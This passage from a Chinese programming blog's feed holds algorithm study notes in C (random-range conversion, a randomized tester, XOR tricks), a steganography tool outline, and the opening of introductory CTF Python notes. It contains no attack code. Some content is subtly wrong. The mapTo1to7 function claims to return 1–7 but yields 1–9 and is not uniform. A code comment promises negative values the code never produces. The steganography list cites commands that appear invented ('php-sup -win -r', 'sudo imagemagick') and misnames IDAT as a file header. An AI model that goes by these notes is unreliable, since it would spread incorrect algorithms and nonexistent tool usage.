class="hljs-type">double</span> <span class="hljs-title function_">xToXPower3</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> Math.max(Math.random(), Math.max(Math.random(), Math.random()));<br>&#125;<br></code></pre></td></tr></table></figure><p>从1<del>5随机到1</del>7随机</p><p>​由一个f1()条件函数1-5到目标函数f3()1-7</p><p>​令有一个01条件发生器f2()，让12为0，让45为1，到3重复，那么f2_ f2_ f2_让每个二进制位上面全部都是f2就好了，就成为了数字的0-7,可是要1-7，那就当0-7时判断当0时重复做一般就成了1-7</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctime&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// f2() - 生成一个 0 或 1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f2</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> rand() % <span class="hljs-number">2</span>;  <span class="hljs-comment">// 返回 0 或 1</span><br>&#125;<br><br><span class="hljs-comment">// f3() - 使用 f2() 生成一个 0 到 7 的整数</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f3</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> ans = (f2() &lt;&lt; <span class="hljs-number">2</span>) + (f2() &lt;&lt; <span class="hljs-number">1</span>) + f2();  <span class="hljs-comment">// 生成一个三位的二进制数</span><br>    <span class="hljs-keyword">return</span> ans;  <span class="hljs-comment">// 返回值是 0 到 7 之间</span><br>&#125;<br><br><span class="hljs-comment">// f1() - 生成一个 1 到 5 之间的随机数</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f1</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> rand() % <span class="hljs-number">5</span> + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 生成 1 到 5 之间的随机数</span><br>&#125;<br><br><span class="hljs-comment">// 将 f1() 映射到 f3() 的 1 到 7</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">mapTo1to7</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> result;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-type">int</span> f1_result = f1();  <span class="hljs-comment">// 1 到 5 之间的随机数</span><br>        <span class="hljs-type">int</span> f3_result = f3();  <span class="hljs-comment">// 0 到 7 之间的随机数</span><br>        <br>        <span class="hljs-comment">// 如果 f3() 结果在 0 到 4 之间，映射成功</span><br>        <span class="hljs-keyword">if</span> (f3_result &gt;= <span class="hljs-number">0</span> &amp;&amp; f3_result &lt; <span class="hljs-number">5</span>) &#123;<br>            result = f1_result + f3_result;<br>            <span class="hljs-keyword">return</span> result;  <span class="hljs-comment">// 返回 1 到 7 之间的随机数</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>);  <span class="hljs-comment">// 如果 f3() 的值大于 4，重新尝试</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    srand(time(<span class="hljs-number">0</span>));  <span class="hljs-comment">// 设置随机数种子</span><br>    <span class="hljs-comment">// 测试</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Random number from 1 to 7: &quot;</span> &lt;&lt; mapTo1to7() &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>从a<del>b随机到c</del>d随机 </p><p>同理使用01条件器，把a-b分类，c-d变成0 -  d-c</p><p>利用这个思想大样本来调试程序</p><p>首先我补一个方法。你给我申请一个random数组。呃，这个长度最好随机，所以有个max长度。我然后值呢值我给你个范围range，这个是范围是吧？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">randomArray</span><span class="hljs-params">(<span class="hljs-type">int</span> len, <span class="hljs-type">int</span> range, <span class="hljs-type">int</span> k, <span class="hljs-type">int</span> m)</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">arr</span><span class="hljs-params">(len)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        arr[i] = rand() % (range + <span class="hljs-number">1</span>); <span class="hljs-comment">// 生成 0 ~ range 的随机数</span><br>        <span class="hljs-keyword">if</span> (arr[i] &lt; k || arr[i] &gt; m) &#123;<br>            arr[i] = rand() % (m - k + <span class="hljs-number">1</span>) + k; <span class="hljs-comment">// 保证数组值在 [k, m] 范围内</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> arr;<br>&#125;<br><br><span class="hljs-comment">// 假设 test 和 onlyKTimes 是两个函数，你需要实现它们</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> k, <span class="hljs-type">int</span> m)</span> &#123;<br>    <span class="hljs-comment">// 假设的实现，具体逻辑根据实际需求填写</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">onlyKTimes</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> k, <span class="hljs-type">int</span> m)</span> &#123;<br>    <span class="hljs-comment">// 假设的实现，具体逻辑根据实际需求填写</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> len = <span class="hljs-number">100</span>;  <span class="hljs-comment">//数组长度最大100</span><br>    <span class="hljs-type">int</span> range = <span class="hljs-number">200</span>; <span class="hljs-comment">//数组的值在-200到200间</span><br>    <span class="hljs-type">int</span> testTime = <span class="hljs-number">100000</span>;  <span class="hljs-comment">//随机次数</span><br>    <span class="hljs-type">int</span> max = <span class="hljs-number">9</span>;<br><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;测试开始&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; testTime; i++) &#123;<br>        <span class="hljs-type">int</span> a = rand() % max + <span class="hljs-number">1</span>; <span class="hljs-comment">// a 1 ~ 9</span><br>        <span class="hljs-type">int</span> b = rand() % max + <span class="hljs-number">1</span>; <span class="hljs-comment">// b 1 ~ 9</span><br>        <span class="hljs-type">int</span> k = min(a, b);<br>        <span class="hljs-type">int</span> m = max(a, b);<br><span class="hljs-comment">//命令k&lt;m</span><br>        <span class="hljs-keyword">if</span> (k == m) &#123;<br>            m++;<br>        &#125;<br><br>        <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; arr = randomArray(len, range, k, m);<br><br>        <span class="hljs-type">int</span> ans1 = test(arr, k, m);<br>        <span class="hljs-type">int</span> ans2 = onlyKTimes(arr, k, m);<br><br>        <span class="hljs-keyword">if</span> (ans1 != ans2) &#123;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;出错了！&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>异或</p><p>异或运算的应用</p><p>1.应用一：不用任何额外变量交换两个数。要求ab所指向的位置必须在不同位置 </p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">a</span> = <span class="hljs-keyword">a</span>^b; b = <span class="hljs-keyword">a</span>^b; <span class="hljs-keyword">a</span> = <span class="hljs-keyword">a</span>^b;  <br></code></pre></td></tr></table></figure><p>2.应用二：在一个数组中找出现奇数次的一种数 [a,b,a,a,b]把所有值都跟eor异或一下，最终结果是出现奇数次的数</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-keyword">eor</span> = <span class="hljs-number">0</span>; <span class="hljs-keyword">eor</span> = <span class="hljs-keyword">eor</span>^a; <span class="hljs-keyword">eor</span> = <span class="hljs-keyword">eor</span>^b; <span class="hljs-keyword">eor</span> = <span class="hljs-keyword">eor</span>^a;  <br></code></pre></td></tr></table></figure><p>3.应用三：二进制int将最右侧的1提取出来组成新的int</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">a&amp;(-a);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>隐写</title>
    <link href="/2024/09/08/%E9%9A%90%E5%86%99/"/>
    <url>/2024/09/08/%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h3 id="1-基础文件处理"><a href="#1-基础文件处理" class="headerlink" title="1. 基础文件处理"></a>1. 基础文件处理</h3><ul><li><strong>文件打包与混淆：</strong><ul><li>利用<code>polyglots</code>技巧进行多文件混合（如：图片与其他文件混合）。</li><li><code>base</code>操作，用于进行编码、解码。</li><li>工具：<code>CyberChef</code>、<code>Cryptool</code>、<code>Hiencode</code>等。</li></ul></li><li><strong>隐写工具及隐写信息提取：</strong><ul><li>使用<code>word</code>进行隐写。</li><li>常用命令：<ul><li><code>ls</code>用于列出隐藏内容。</li><li><code>php-sup -win -r</code>相关命令用于分析和处理隐写信息。</li></ul></li><li>其他工具：<code>stegsolve</code>、<code>pngcheck</code>、<code>exiftool</code>、<code>snow</code>（雪隐写工具）。</li></ul></li></ul><hr><h3 id="2-隐写术工具及技术"><a href="#2-隐写术工具及技术" class="headerlink" title="2. 隐写术工具及技术"></a>2. 隐写术工具及技术</h3><ul><li><strong>图片隐写处理：</strong><ul><li>使用<code>pngcheck</code>分析PNG格式图像。</li><li>了解文件格式结构，文件头（IDAT）等。</li><li>隐写信息提取工具：<code>stegsolve</code>、<code>stegdetect</code>。</li></ul></li><li><strong>音频隐写处理：</strong><ul><li>使用<code>audacity</code>工具分析音频文件中的隐写信息。</li><li>支持的文件格式：<code>mp3</code>、<code>wav</code>、<code>mp4</code>等。</li></ul></li><li><strong>视频及其他格式隐写处理：</strong><ul><li>使用<code>imagemagick</code>处理GIF等格式文件。</li><li>命令：<code>sudo imagemagick</code>用于分析图像及GIF。</li></ul></li></ul><hr><h3 id="3-隐写检测及分析工具"><a href="#3-隐写检测及分析工具" class="headerlink" title="3. 隐写检测及分析工具"></a>3. 隐写检测及分析工具</h3><ul><li><strong>常见隐写检测工具：</strong><ul><li><code>pngcheck</code>用于PNG格式的隐写检测。</li><li><code>stegdetect</code>用于JPG隐写的检测。</li></ul></li><li><strong>其他高级隐写分析工具：</strong><ul><li><code>blindwatermark</code>（盲水印分析工具）。</li><li><code>stegano</code>系列工具，如<code>xiasteganography</code>。</li></ul></li></ul><hr><h3 id="4-高级隐写技术及其他相关工具"><a href="#4-高级隐写技术及其他相关工具" class="headerlink" title="4. 高级隐写技术及其他相关工具"></a>4. 高级隐写技术及其他相关工具</h3><ul><li><strong>多种隐写工具对比及测试：</strong><ul><li>对比不同隐写工具的优劣，如：<code>bmfontpy3</code>、<code>blindwatermark</code>等。</li><li><code>cover</code>和<code>coalesce</code>等命令用于分析音频、视频的隐写信息。</li></ul></li><li><strong>常用隐写术的命令及工具：</strong><ul><li><code>mp3info</code>、<code>ffmpeg</code>、<code>snow</code>等工具。</li></ul></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ctf基础笔记</title>
    <link href="/2024/09/05/ctf%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/09/05/ctf%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p><strong>CTF</strong> <strong>成员基础语法笔记</strong></p><p><strong>目录</strong></p><ol><li><strong>Python</strong> <strong>基础</strong></li><li><strong>JavaScript</strong> <strong>基础</strong></li><li><strong>PHP</strong> <strong>框架 - ThinkPHP</strong></li><li></li></ol><h1 id="1-Python-基础"><a href="#1-Python-基础" class="headerlink" title="1. Python 基础"></a><strong>1. Python</strong> <strong>基础</strong></h1><hr><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul><li><p><a href="#1-python%E5%9F%BA%E7%A1%80">1. Python基础</a></p><ul><li><a href="#11-python%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95">1.1 Python基本语法</a></li><li><a href="#12-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">1.2 数据类型</a></li><li><a href="#13-%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C%E7%AC%A6">1.3 常见操作符</a></li><li><a href="#14-%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5">1.4 条件语句</a></li><li><a href="#15-%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84">1.5 循环结构</a></li><li><a href="#16-%E5%88%97%E8%A1%A8%E4%B8%8E%E5%AD%97%E5%85%B8">1.6 列表与字典</a></li></ul></li><li><p><a href="#2-%E5%87%BD%E6%95%B0%E4%B8%8E%E6%A8%A1%E5%9D%97">2. 函数与模块</a></p><ul><li><a href="#21-%E5%87%BD%E6%95%B0%E5%AE%9A%E4%B9%89%E4%B8%8E%E8%B0%83%E7%94%A8">2.1 函数定义与调用</a></li><li><a href="#22-%E6%A8%A1%E5%9D%97%E5%AF%BC%E5%85%A5">2.2 模块导入</a></li></ul></li><li><p><a href="#3-%E8%BF%9B%E9%98%B6%E5%86%85%E5%AE%B9">3. 进阶内容</a></p><ul><li><a href="#31-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99">3.1 文件读写</a></li><li><a href="#32-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">3.2 异常处理</a></li><li><a href="#33-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8Fregex">3.3 正则表达式（Regex）</a></li><li><a href="#34-%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86">3.4 加密与解密</a></li></ul></li><li><p><a href="#4-%E9%AB%98%E7%BA%A7%E5%86%85%E5%AE%B9">4. 高级内容</a></p><ul><li><a href="#41-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%A4%9A%E8%BF%9B%E7%A8%8B">4.1 多线程与多进程</a></li><li><a href="#42-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%88%AC%E8%99%AB">4.2 网络与爬虫</a></li><li><a href="#43-%E5%88%A9%E7%94%A8python%E8%BF%9B%E8%A1%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99">4.3 利用Python进行自动化脚本编写</a></li></ul></li><li><p><a href="#5-ctf%E4%B8%AD%E7%9A%84python%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF">5. CTF中的Python应用场景</a></p><ul><li><a href="#51-exploit%E5%BC%80%E5%8F%91">5.1 Exploit开发</a></li><li><a href="#52-%E9%80%86%E5%90%91%E4%B8%8E%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90">5.2 逆向与二进制分析</a></li><li><a href="#53-%E5%A4%8D%E6%9D%82%E7%9A%84%E7%AE%97%E6%B3%95%E9%A2%98">5.3 复杂的算法题</a></li></ul></li></ul><h4 id="1-1-Python基本语法"><a href="#1-1-Python基本语法" class="headerlink" title="1.1 Python基本语法"></a>1.1 Python基本语法</h4><p><strong>Hello World</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello, World!&quot;</span>)<br></code></pre></td></tr></table></figure><p>这是Python的入门示例，了解Python如何输出信息。</p><h4 id="1-2-数据类型"><a href="#1-2-数据类型" class="headerlink" title="1.2 数据类型"></a>1.2 数据类型</h4><p>Python中的基本数据类型包括：</p><ul><li><strong>整数（int）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure></li><li><strong>浮点数（float）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">y = <span class="hljs-number">3.14</span><br></code></pre></td></tr></table></figure></li><li><strong>字符串（str）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name = <span class="hljs-string">&quot;Python&quot;</span><br></code></pre></td></tr></table></figure></li><li><strong>布尔值（bool）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">is_true = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="1-3-常见操作符"><a href="#1-3-常见操作符" class="headerlink" title="1.3 常见操作符"></a>1.3 常见操作符</h4><ul><li>算术操作：<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>//</code>（整除），<code>%</code>（取模）</li><li>比较操作：<code>==</code>, <code>!=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code></li><li>逻辑操作：<code>and</code>, <code>or</code>, <code>not</code></li></ul><h4 id="1-4-条件语句"><a href="#1-4-条件语句" class="headerlink" title="1.4 条件语句"></a>1.4 条件语句</h4><p>CTF中的许多逻辑都依赖于条件判断，了解<code>if-else</code>语句是必要的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">5</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x 大于 5&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x 小于或等于 5&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="1-5-循环结构"><a href="#1-5-循环结构" class="headerlink" title="1.5 循环结构"></a>1.5 循环结构</h4><p>Python有两种常用的循环：<code>for</code>循环和<code>while</code>循环。</p><p><strong>for 循环</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p><strong>while 循环</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> x &lt; <span class="hljs-number">5</span>:<br>    <span class="hljs-built_in">print</span>(x)<br>    x += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="1-6-列表与字典"><a href="#1-6-列表与字典" class="headerlink" title="1.6 列表与字典"></a>1.6 列表与字典</h4><ul><li><p><strong>列表（List）</strong>：存储多个元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure></li><li><p><strong>字典（Dictionary）</strong>：键值对存储结构。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">my_dict = &#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="2-函数与模块"><a href="#2-函数与模块" class="headerlink" title="2. 函数与模块"></a>2. 函数与模块</h3><h4 id="2-1-函数定义与调用"><a href="#2-1-函数定义与调用" class="headerlink" title="2.1 函数定义与调用"></a>2.1 函数定义与调用</h4><p>函数在CTF中是组织代码、复用功能的重要工具。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Hello, <span class="hljs-subst">&#123;name&#125;</span>!&quot;</span><br><br><span class="hljs-built_in">print</span>(greet(<span class="hljs-string">&quot;CTF 选手&quot;</span>))<br></code></pre></td></tr></table></figure><h4 id="2-2-模块导入"><a href="#2-2-模块导入" class="headerlink" title="2.2 模块导入"></a>2.2 模块导入</h4><p>CTF中常用Python标准库和第三方模块进行信息处理。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib  <span class="hljs-comment"># 用于哈希函数</span><br><br><span class="hljs-comment"># 生成字符串的MD5值</span><br>hash_object = hashlib.md5(<span class="hljs-string">b&#x27;CTF&#x27;</span>).hexdigest()<br><span class="hljs-built_in">print</span>(hash_object)<br></code></pre></td></tr></table></figure><p>CTF常用的模块包括<code>hashlib</code>（处理哈希算法）、<code>requests</code>（网络请求）、<code>re</code>（正则表达式）等。</p><h3 id="3-进阶内容"><a href="#3-进阶内容" class="headerlink" title="3. 进阶内容"></a>3. 进阶内容</h3><h4 id="3-1-文件读写"><a href="#3-1-文件读写" class="headerlink" title="3.1 文件读写"></a>3.1 文件读写</h4><p>在CTF比赛中，很多情况下需要对文件进行读写操作，通常用于读取输入数据或写入解题结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 读取文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;input.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><br><span class="hljs-comment"># 写入文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;这是结果输出&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="3-2-异常处理"><a href="#3-2-异常处理" class="headerlink" title="3.2 异常处理"></a>3.2 异常处理</h4><p>CTF中的代码有时会出现意外错误，异常处理可以确保程序在错误情况下也能稳定运行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    result = <span class="hljs-number">10</span> / <span class="hljs-number">0</span><br><span class="hljs-keyword">except</span> ZeroDivisionError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不能除以0！&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="3-3-正则表达式（Regex）"><a href="#3-3-正则表达式（Regex）" class="headerlink" title="3.3 正则表达式（Regex）"></a>3.3 正则表达式（Regex）</h4><p>正则表达式常用于CTF中的信息提取，尤其是文本分析和数据过滤。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br>text = <span class="hljs-string">&quot;flag&#123;this_is_a_flag&#125;&quot;</span><br>pattern = <span class="hljs-string">r&#x27;flag&#123;.*&#125;&#x27;</span><br><span class="hljs-keyword">match</span> = re.search(pattern, text)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;找到了flag:&quot;</span>, <span class="hljs-keyword">match</span>.group())<br></code></pre></td></tr></table></figure><h4 id="3-4-加密与解密"><a href="#3-4-加密与解密" class="headerlink" title="3.4 加密与解密"></a>3.4 加密与解密</h4><p>在CTF中，加密与解密任务非常常见。使用Python处理常见的加密&#x2F;解密任务是一项必备技能。</p><p><strong>Base64解码</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>encoded = <span class="hljs-string">b&#x27;UHl0aG9u&#x27;</span><br>decoded = base64.b64decode(encoded)<br><span class="hljs-built_in">print</span>(decoded.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><p><strong>哈希计算</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 